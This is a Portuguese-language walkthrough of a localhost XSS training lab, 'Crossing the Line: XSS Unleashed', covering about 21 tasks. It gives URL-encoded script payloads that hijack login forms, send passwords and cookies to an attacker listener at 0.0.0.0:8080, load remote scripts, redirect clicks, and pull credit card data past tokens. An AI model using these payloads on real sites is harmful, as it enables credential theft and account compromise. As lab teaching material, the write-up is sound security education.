...
Com isso em mente, podemos dizer claramente que o objetivo do projeto <span style="color: #1cce43">Crossing the Line: XSS Unleashed</span> é exclusivamente expandir os horizontes de ataque, quando uma situação de XSS é encontrada. Tendo em vista dois pontos principais:
...
O projeto está disponível em meu GitHub no endereço [https://github.com/h41stur/xss_unleashed](https://github.com/h41stur/xss_unleashed){:target="\_blank"}. O Crossing the Line: XSS Unleashed utiliza como base o contêiner `php:7.4-apache` e todo o código-fonte das tasks é baseado em HTML e PHP.
...
![Menu](/img/posts/Pasted%20image%2020250122191845.png)
...
![Task 1](/img/posts/Pasted%20image%2020250122191944.png)
...
- [http://localhost/task-01/?search=test](http://localhost/task-01/?search=test)

![Valor refletido](/img/posts/Pasted%20image%2020250122192128.png)

Consultando o HTML da página, podemos obter o contexto onde o código malicioso atuará.

![Contexto](/img/posts/Pasted%20image%2020250122192227.png)
...
```html
<script>
	document.getElementsByTagName("h1")[1].innerHTML = "Modificado!";
...
```
%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B1%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/task-01/?search=%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B1%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E](http://localhost/task-01/?search=%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B1%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E)

![Resultado](/img/posts/Pasted%20image%2020250122192523.png)
...
![Task 2](/img/posts/Pasted%20image%2020250122192609.png)
...
Para objetos do tipo *form* o JavaScript já possui o método `forms` que identifica cada formulário dentro do documento, e cria um *array* com todos (mesmo que só exista um). Portanto, para identificar o primeiro ou o único formulário em uma página, podemos fazer da seguinte forma:
...
- [http://localhost/task-02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E](http://localhost/task-02/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22input%22%29%3B%0A%09var%20prev%20%3D%20document.forms%5B0%5D.elements%5B0%5D%3B%0A%09document.forms%5B0%5D.insertBefore%28input%2C%20prev%29%3B%0A%3C%2Fscript%3E)

![Form](/img/posts/Pasted%20image%2020250122192901.png)
...
![Classes](/img/posts/Pasted%20image%2020250122193012.png)
...
![Resultado](/img/posts/Pasted%20image%2020250122193137.png)
...
![Task 3](/img/posts/Pasted%20image%2020250122193211.png)

#### Objetivo

O objetivo desta *task* é interceptar a submissão do formulário ao efetuar *login*, a princípio esta *task* pede simplesmente para imprimir um alerta na tela com o usuário e senha ao submeter o formulário, porém, nas próximas *tasks* iremos implementar mais complexidade.
...
- [http://localhost/task-03/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E](http://localhost/task-03/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28username%20%2B%20%27%20%3A%20%27%20%2B%20password%29%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E)
...
![Resultado](/img/posts/Pasted%20image%2020250122193543.png)
...
![Task 4](/img/posts/Pasted%20image%2020250122193617.png)
...
Outra coisa a se considerar é o comportamento natural das coisas. Por exemplo, quando submetemos um formulário, o comportamento natural é o request com seus elementos. Portanto, se inserirmos uma lógica durante o evento `submit`, é provável que ela não seja executada, caso exista um construtor envolvido.

Para tanto, podemos utilizar o `event.preventDefault()`. O método event.preventDefault() é uma funcionalidade do DOM (Document Object Model) do JavaScript usada para cancelar o comportamento padrão de um evento no navegador. Ele é particularmente útil quando você deseja manipular um evento de maneira personalizada, sem que o navegador execute automaticamente a ação padrão associada a ele.
...
```
%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09event.preventDefault%28%29%3B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/task-04/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09event.preventDefault%28%29%3B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E](http://localhost/task-04/?search=%3Cscript%3E%0A%0A%09function%20InterceptForm%28%29%20%7B%0A%09%09event.preventDefault%28%29%3B%0A%09%09var%20username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09var%20password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fuser%3D%22%2Busername%2B%22%26pass%3D%22%2Bpassword%3B%0A%09%7D%0A%09%0A%09document.forms%5B0%5D.onsubmit%20%3D%20InterceptForm%3B%0A%3C%2Fscript%3E)

Podemos iniciar um *Python server* na porta 8080 configurada para ouvir a requisição feita.

![Python server](/img/posts/Pasted%20image%2020250122193930.png)
...
![Resultado](/img/posts/Pasted%20image%2020250122233352.png)
...
![Task 5](/img/posts/Pasted%20image%2020250122233427.png)
...
![Task 6](/img/posts/Pasted%20image%2020250122233626.png)
...
- [http://localhost/task-06/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E](http://localhost/task-06/?search=%3Cscript%3E%0A%09var%20input%20%3D%20document.createElement%28%22h2%22%29%3B%0A%09input.setAttribute%28%22class%22%2C%20%22h41stur%22%29%3B%0A%09input.innerHTML%20%3D%20%22Site%20fora%20do%20ar%21%20Por%20favor%20v%C3%A1%20para%20https%3A%2F%2Fh41stur.com%22%3B%0A%09document.forms%5B0%5D.parentNode.appendChild%28input%29%3B%0A%09document.forms%5B0%5D.parentNode.removeChild%28document.forms%5B0%5D%29%3B%09%0A%3C%2Fscript%3E)

![Resultado](/img/posts/Pasted%20image%2020250122233910.png)
...
![Task 7](/img/posts/Pasted%20image%2020250122233950.png)
...
2. O campo `email` do formulário fica com seu `value` preenchido com o e-mail informado.

![Campo preenchido](/img/posts/Pasted%20image%2020250122234136.png)
...
- [http://localhost/task-07/?email=%22%20teste%3D%22h41stur&password=](http://localhost/task-07/?email=%22%20teste%3D%22h41stur&password=)

Ao checarmos o código HTML da página, veremos que saímos do escopo `value` e criamos uma nova propriedade.

![Contexto alterado](/img/posts/Pasted%20image%2020250122234320.png)
...
- [http://localhost/task-07/?email=%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D&password=](http://localhost/task-07/?email=%22%20onmouseover%3D%22%0A%09document.forms%5B0%5D.onsubmit%20%3D%20function%20demo%20%28%29%20%7B%0A%09%09var%20pass%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09alert%28pass%29%3B%0A%09%7D&password=)

Com isso, o código HTML foi alterado e o script injetado no *event listener*.

![Event listener](/img/posts/Pasted%20image%2020250122234525.png)

Desta forma, quando o usuário submeter o formulário com usuário e senha, o alerta será impresso com a senha.

![Resultado](/img/posts/Pasted%20image%2020250122234553.png)
...
![Task 8](/img/posts/Pasted%20image%2020250122234634.png)
...
- [http://localhost/task-08/?search=%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E](http://localhost/task-08/?search=%3Cscript%3E%0A%09function%20CaughtClick%28%29%20%7B%0A%09%09window.location%20%3D%20%22https%3A%2F%2Fh41stur.com%22%3B%0A%09%7D%0A%09document.body.addEventListener%28%27click%27%2C%20CaughtClick%2C%20true%29%3B%0A%3C%2Fscript%3E)
...
![Task 9](/img/posts/Pasted%20image%2020250122234822.png)
...
![Resultado](/img/posts/Pasted%20image%2020250122235209.png)
...
![Task 10](/img/posts/Pasted%20image%2020250122235310.png)

#### Objetivo

O objetivo desta *task* é invocar um script JavaScript externo que por sua vez vai imprimir um alerta com o *cookie* do usuário, e, em seguida, enviar este *cookie* para a máquina sob controle do atacante.
...
- [http://localhost/task-10/?search=%3Cscript%20src%3D%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3E%3C%2Fscript%3E](http://localhost/task-10/?search=%3Cscript%20src%3D%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3E%3C%2Fscript%3E)
...
![Task 11](/img/posts/Pasted%20image%2020250123063250.png)

#### Objetivo

O objetivo desta *task*, assim como a anterior, é invocar um script JavaScript externo que por sua vez vai imprimir um alerta com o *cookie* do usuário, porém, desta vez, a importação deste script deve ser feito com JavaScript.
...
- [http://localhost/task-11/?search=%3Cscript%3E%0A%09var%20newtag%20%3D%20document.createElement%28%27script%27%29%3B%0A%09newtag.type%20%3D%20%22text%2Fjavascript%22%3B%0A%09newtag.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3B%0A%09document.body.appendChild%28newtag%29%3B%0A%3C%2Fscript%3E](http://localhost/task-11/?search=%3Cscript%3E%0A%09var%20newtag%20%3D%20document.createElement%28%27script%27%29%3B%0A%09newtag.type%20%3D%20%22text%2Fjavascript%22%3B%0A%09newtag.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2Fscript.js%22%3B%0A%09document.body.appendChild%28newtag%29%3B%0A%3C%2Fscript%3E)


Ao acessar a URL, um alerta é impresso com o *cookie*.

![Cookie](/img/posts/Pasted%20image%2020250123063627.png)

E logo em seguida este *cookie* é enviado para a máquina do atacante. Perceba ambas as requisições efetuadas pela vítima.

![Resultado](/img/posts/Pasted%20image%2020250123063649.png)
...
![Task 12](/img/posts/Pasted%20image%2020250123063727.png)
...
- [http://localhost/task-12/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09document.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%22%3B%0A%09%09document.forms%5B0%5D.method%20%3D%20%22GET%22%3B%0A%09%09document.forms%5B0%5D.submit%28%29%3B%0A%09%7D%20%2C3000%29%3B%0A%3C%2Fscript%3E](http://localhost/task-12/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09document.forms%5B0%5D.action%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%22%3B%0A%09%09document.forms%5B0%5D.method%20%3D%20%22GET%22%3B%0A%09%09document.forms%5B0%5D.submit%28%29%3B%0A%09%7D%20%2C3000%29%3B%0A%3C%2Fscript%3E)


Ao carregar a página, as credenciais armazenadas são carregadas nos campos do formulário.

![Credenciais carregadas](/img/posts/Pasted%20image%2020250123064011.png)

Logo em seguida, os dados são encaminhados para o *Python server*.

![Resultado](/img/posts/Pasted%20image%2020250123064040.png)
...
![Task 13](/img/posts/Pasted%20image%2020250123064116.png)
...
```
%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%09req.open%28%22GET%22%2C%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fusername%3D%22%2Busername%2B%22%26password%3D%22%2Bpassword%2C%20true%29%3B%0A%09%09req.send%28%29%3B%20%0A%09%7D%2C%203000%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/task-13/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%09req.open%28%22GET%22%2C%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fusername%3D%22%2Busername%2B%22%26password%3D%22%2Bpassword%2C%20true%29%3B%0A%09%09req.send%28%29%3B%20%0A%09%7D%2C%203000%29%3B%0A%3C%2Fscript%3E](http://localhost/task-13/?search=%3Cscript%3E%0A%09window.setTimeout%28function%28%29%20%7B%0A%09%09username%20%3D%20document.forms%5B0%5D.elements%5B0%5D.value%3B%0A%09%09password%20%3D%20document.forms%5B0%5D.elements%5B1%5D.value%3B%0A%09%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09%09req.open%28%22GET%22%2C%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fusername%3D%22%2Busername%2B%22%26password%3D%22%2Bpassword%2C%20true%29%3B%0A%09%09req.send%28%29%3B%20%0A%09%7D%2C%203000%29%3B%0A%3C%2Fscript%3E)


Ao carregar a página, as credenciais armazenadas são carregadas nos campos do formulário.

![Task 13](/img/posts/Pasted%20image%2020250123064422.png)


Logo em seguida, os dados são encaminhados para o *Python server*.

![Resultado](/img/posts/Pasted%20image%2020250123064448.png)
...
![Task 14](/img/posts/Pasted%20image%2020250123064521.png)
...
Primeiramente, precisamos entender a arquitetura da aplicação. Seguindo as orientações da aplicação, existe o *endpoint* **/task-14/creditCard/** que recebe o parâmetro **user** para retornar o número do cartão de crédito. Portanto, ao acessar a URL abaixo, somos levados ao destino.

- [http://localhost/task-14/creditCard/?user=h41stur](http://localhost/task-14/creditCard/?user=h41stur)
...
req.open("GET", "/task-14/creditCard/?user=h41stur", true);
req.send();
</script>
```
...
```
%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2Ftask-14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/task-14/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2Ftask-14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E](http://localhost/task-14/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2Ftask-14%2FcreditCard%2F%3Fuser%3Dh41stur%22%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E)

Ao acessar a URL, temos o número do cartão impresso na tela.

![Resultado](/img/posts/Pasted%20image%2020250123065018.png)
...
![Task 15](/img/posts/Pasted%20image%2020250123065042.png)
...
Assim com ona *task* anterior, existe um *endpoint* que retorna o número do cartão de crédito, o **/task-15/creditCard/** seguido do parâmetro **user**.
...
req.open("POST", "/task-15/creditCard/", true);
...
```
%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22POST%22%2C%20%22%2Ftask-15%2FcreditCard%2F%22%2C%20true%29%3B%0Areq.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Areq.send%28%22user%3Dh41stur%22%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/task-15/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22POST%22%2C%20%22%2Ftask-15%2FcreditCard%2F%22%2C%20true%29%3B%0Areq.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Areq.send%28%22user%3Dh41stur%22%29%3B%0A%3C%2Fscript%3E](http://localhost/task-15/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%0A%09%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22POST%22%2C%20%22%2Ftask-15%2FcreditCard%2F%22%2C%20true%29%3B%0Areq.setRequestHeader%28%22Content-Type%22%2C%20%22application%2Fx-www-form-urlencoded%22%29%3B%0Areq.send%28%22user%3Dh41stur%22%29%3B%0A%3C%2Fscript%3E)

Ao acessar a URL, temos o número do cartão impresso na tela.

![Resultado](/img/posts/Pasted%20image%2020250123065512.png)
...
![Task 16](/img/posts/Pasted%20image%2020250123070446.png)
...
A exploração é muito parecida com as anteriores, porém neste caso, é preciso passar um *token* de validação que existe na URL, portanto, é preciso extrair este token antes de montar a requisição.
...
req.open("GET", "/task-16/creditCard/?user=h41stur&"+token, true);
req.send();
</script>
```
...
```
%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Areq.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0A%0Avar%20token%20%3D%20window.location.search.split%28%22%26%22%29%5B1%5D%3B%0Areq.open%28%22GET%22%2C%20%22%2Ftask-16%2FcreditCard%2F%3Fuser%3Dh41stur%26%22%2Btoken%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/task-16/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Areq.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0A%0Avar%20token%20%3D%20window.location.search.split%28%22%26%22%29%5B1%5D%3B%0Areq.open%28%22GET%22%2C%20%22%2Ftask-16%2FcreditCard%2F%3Fuser%3Dh41stur%26%22%2Btoken%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E&token=d8aea5b04b59ad8a36d1e2c10a77c426](http://localhost/task-16/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%0Areq.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20req.responseText%3B%0A%09%7D%0A%7D%3B%0A%0Avar%20token%20%3D%20window.location.search.split%28%22%26%22%29%5B1%5D%3B%0Areq.open%28%22GET%22%2C%20%22%2Ftask-16%2FcreditCard%2F%3Fuser%3Dh41stur%26%22%2Btoken%2C%20true%29%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E&token=d8aea5b04b59ad8a36d1e2c10a77c426)

Ao acessar a URL, temos o número do cartão impresso na tela.

![Resultado](/img/posts/Pasted%20image%2020250123070519.png)
...
![Task 17](/img/posts/Pasted%20image%2020250123070542.png)
...
![CSRF token](/img/posts/Pasted%20image%2020250123070714.png)
...
req.open("POST", "/task-17/creditCard/", true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
...
![Resultado](/img/posts/Pasted%20image%2020250123094124.png)
...
![Task 18](/img/posts/Pasted%20image%2020250123094156.png)
...
![User data](/img/posts/Pasted%20image%2020250123094341.png)
...
![User data](/img/posts/Pasted%20image%2020250123094433.png)
...
req.open("GET", "/task-18/user/", true);
...
```
%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%7B%0A%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09var%20user_data%20%3D%20htmlPage.getElementById%28%22user_data%22%29.innerHTML%3B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20user_data%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2Ftask-18%2Fuser%2F%22%2C%20true%29%3B%0Areq.responseType%20%3D%20%22document%22%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E
```

Gerando a seguinte URL:

- [http://localhost/task-18/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%7B%0A%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09var%20user_data%20%3D%20htmlPage.getElementById%28%22user_data%22%29.innerHTML%3B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20user_data%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2Ftask-18%2Fuser%2F%22%2C%20true%29%3B%0Areq.responseType%20%3D%20%22document%22%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E](http://localhost/task-18/?search=%3Cscript%3E%0Avar%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0Areq.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%7B%0A%09%09var%20htmlPage%20%3D%20req.responseXML%3B%0A%09%09var%20user_data%20%3D%20htmlPage.getElementById%28%22user_data%22%29.innerHTML%3B%0A%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20user_data%3B%0A%09%7D%0A%7D%3B%0Areq.open%28%22GET%22%2C%20%22%2Ftask-18%2Fuser%2F%22%2C%20true%29%3B%0Areq.responseType%20%3D%20%22document%22%3B%0Areq.send%28%29%3B%0A%3C%2Fscript%3E)

Ao acessar a URL, temos os dados impressos na tela.

![Resultado](/img/posts/Pasted%20image%2020250123094708.png)
...
![Task 19](/img/posts/Pasted%20image%2020250123094735.png)
...
![Segunda tela](/img/posts/Pasted%20image%2020250123095154.png)


- O método utilizado é POST
- O `action` do formulário aponta para o *endpoint* `task-19/creditCard/`
...
![Terceira tela](/img/posts/Pasted%20image%2020250123095242.png)
...
<script>
	...
	req.onreadystatechange = function() {
		if (req.readyState == 4 && req.status == 200) {
			...
			req2.open("POST", "task-19/creditCard/", true);
...
![Terceira tela](/img/posts/Pasted%20image%2020250123095417.png)
...
![Task 20](/img/posts/Pasted%20image%2020250123095759.png)
...
- [http://localhost/task-20/getToken/?user_id=3663](http://localhost/task-20/getToken/?user_id=3663)

![JSON](/img/posts/Pasted%20image%2020250123095855.png)
...
- [http://localhost/task-20/getPass/?user_id=3663&token=d8aea5b04b59ad8a36d1e2c10a77c426](http://localhost/task-20/getPass/?user_id=3663&token=d8aea5b04b59ad8a36d1e2c10a77c426)

![Segundo JSON](/img/posts/Pasted%20image%2020250123095933.png)
...
<script>
	...
	req.onreadystatechange = function() {
		if (req.readyState == 4 && req.status == 200) {
			...
			req2.open("GET", "task-20/getPass/?user_id="+id+"&token="+token, true);
			req2.send();
		}
	}

	req.open("GET", "task-20/getToken/?user_id="+id, true);
	req.send();
</script>
```
...
![Task 21](/img/posts/Pasted%20image%2020250123100250.png)
...
![XML](/img/posts/Pasted%20image%2020250123100344.png)
...
- [http://localhost/task-21/creditCards/?user_id=3663&token=d8aea5b04b59ad8a36d1e2c10a77c426](http://localhost/task-21/creditCards/?user_id=3663&token=d8aea5b04b59ad8a36d1e2c10a77c426)

![Cartões](/img/posts/Pasted%20image%2020250123100432.png)
...
- [http://localhost/task-21/?search=%3Cscript%3E%0A%09var%20req%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20req2%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%09var%20link%20%3D%20document.getElementById%28%22endpoints%22%29.href%3B%0A%0A%09req2.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req2.readyState%20%3D%3D%204%20%26%26%20req2.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20cards%20%3D%20JSON.parse%28req2.responseText%29%3B%0A%09%09%09var%20parsed%20%3D%20cards.card_1%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_2%20%2B%20%22%3Cbr%3E%22%20%2B%20cards.card_3%3B%0A%09%09%09document.getElementById%28%22exploit%22%29.innerHTML%20%3D%20parsed%3B%0A%09%09%09new%20Image%28%29.src%20%3D%20%22http%3A%2F%2F0.0.0.0%3A8080%2F%3Fc1%3D%22%2Bcards.card_1%2B%22%26c2%3D%22%2Bcards.card_2%2B%22%26c3%3D%22%2Bcards.card_3%3B%0A%09%09%7D%0A%09%7D%0A%0A%09req.onreadystatechange%20%3D%20function%28%29%20%7B%0A%09%09if%20%28req.readyState%20%3D%3D%204%20%26%26%20req.status%20%3D%3D%20200%29%20%7B%0A%09%09%09var%20id%20%3D%20req.responseXML.getElementsByTagName%28%22user_id-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20token%20%3D%20req.responseXML.getElementsByTagName%28%22token-param-value%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%09%09%09var%20endpoint%20%3D%20req.responseXML.getElementsByTagName%28%22endpoint%22%29%5B0%5D.childNodes%5B0%5D.nodeValue%3B%0A%0A%09%09%09req2.open%28%22GET%22%2C%20endpoint%2B%22%3Fuser_id%3D%22%2Bid%2B%22%26token%3D%22%2Btoken%2C%20true%29%3B%0A%09%09%09req2.send%28%29%3B